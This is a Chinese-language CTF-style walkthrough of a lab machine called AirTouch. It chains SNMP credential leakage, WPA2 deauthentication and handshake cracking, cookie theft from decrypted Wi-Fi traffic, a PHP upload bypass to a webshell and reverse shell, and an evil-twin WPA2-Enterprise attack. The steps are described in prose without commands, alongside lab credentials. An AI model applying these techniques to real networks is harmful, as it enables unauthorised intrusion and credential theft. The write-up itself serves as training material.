1. Initial Access

1.1 端口扫描

对目标机器进行端口扫描和服务扫描，首先进行TCP半连接扫描。

扫描结果中只有一个22/SSH端口开放，需要继续进行UDP扫描。

对目标机器进行UDP扫描：由于UDP扫描是无连接的，需要等待ICMP返回端口不可达，扫描速率很慢。

发现目标机器开放161/SNMP端口。

1.2 SNMP凭证泄露

使用SNMP-Brute爆破SNMP协议的社区字符串为public。

继续用snmpwalk读取目标设备信息，得到consultant:RxBlZhLmOkacNWScmZ6D。

使用上面得到的凭据进行连接。

2. AirTouch-Internet

2.1 WPA2-PSK Cracking

查看sudo权限设置，发现当前用户可以无密码以root执行任何命令，切换到root用户。

查看所有的无线网卡配置信息：有很多张无线网卡处于Managed模式，但是都没有连接Wifi。

将wlan0网卡从Managed模式启动为Monitor模式。

利用上面启动为Monitor模式的无线网卡进行扫描。

从扫描结果发现有5个AP设备和3个客户端设备，其中有一台客户端设备连接了AirTouch-Internet。

对名为AirTouch-Internet的AP进行监听，设置监听信道6。

设置信道6，发送Deauth攻击，并设置发包网卡为wlan1。

用字典对抓到的WPA握手包进行离线爆破，得到了AP的连接密码为challenge。

现在生成配置并连接AirTouch-Internet网络。

请求AP使用DHCP协议为当前机器分配IP地址。

2.2 SSH本地端口转发

首先对192.168.3.0/24网段进行ICMP扫描。

继续对192.168.3.1地址进行TCP全端口扫描。

通过SSH本地端口转发，将攻击机的7777端口流量通过SSH隧道转发到192.168.3.1的80端口。

这时候访问本地的7777端口即可访问到内网的Web服务。

2.3 流量包泄露Cookie

简单对Web站点枚举并做目录扫描，除了登录界面，只有一个上传目录。

大致知道了登录上去之后应该有一个上传页面，现在需要突破认证限制。

有两种思路，第一种是正面利用，比如弱口令、SQL注入等，第二种则是通过钓鱼等手段侧面利用。

而在做WPA2-PSK Cracking攻击时，监听过一段时间流量包，将流量包传输到本地。

打开流量包后首先要做的是解密流量包，设置解密Key为challenge:AirTouch-Internet。

其中有一些为http流量，其中泄露了有效的用户Cookie。

用上面的Cookie登录站点成功。

修改UserRole为admin，成功进入管理员界面，可以进行文件上传。

2.4 文件上传绕过RCE

这是个PHP站点，需要绕过限制上传WebShell，直接上传失败。

修改文件为phtml之后上传成功。

在当前机器监听，在目标Web服务器上反弹Shell得到一个伪Shell。

2.5 PHP脚本凭证泄露

在login.php中泄露了两组凭据。

使用user用户SSH连接成功。

3. AirTouch-Office

3.1 WPA2-Enterprise

在上面AirTouch-Internet的AP机器中，发现了send_certs.sh。

该脚本用于将证书等同步到远程服务器，这个服务器应该是AirTouch-Office的AP。

并且发现了一组凭据remote:xGgWEwqUpfoOVsLeROeG。

将目标机器上的ca.crt、server.crt、server.key下载到第一台机器。

再次扫描网络，在44信道，看到了AirTouch-Office网络。

导入上面的证书和私钥，用于伪造AirTouch-Office的RADIUS认证服务器。

之后创建虚假的AirTouch-Office网络，等待用户进行连接，等待一会儿接收到连接凭据。

使用Hashcat爆破密码为laboratory。

创建连接配置文件，并且连接AirTouch-Office网络。

之后查看wlan2无线网卡，发现已经连接成功。

让AP使用DHCP协议分配IP地址给当前机器。

4. 总结思考

4.1 SNMP凭证泄露

SNMP是一种管理网络设备的协议，通常运行于161/UDP端口，用于读取设备状态信息。

在SNMP v1/v2c中，认证机制非常简单，依赖于社区字符串。

常见的默认值有：很多设备出厂默认是public。

  • public：只读。
  • private：读写。

SNMP泄露的本质即是弱认证机制和明文传输。
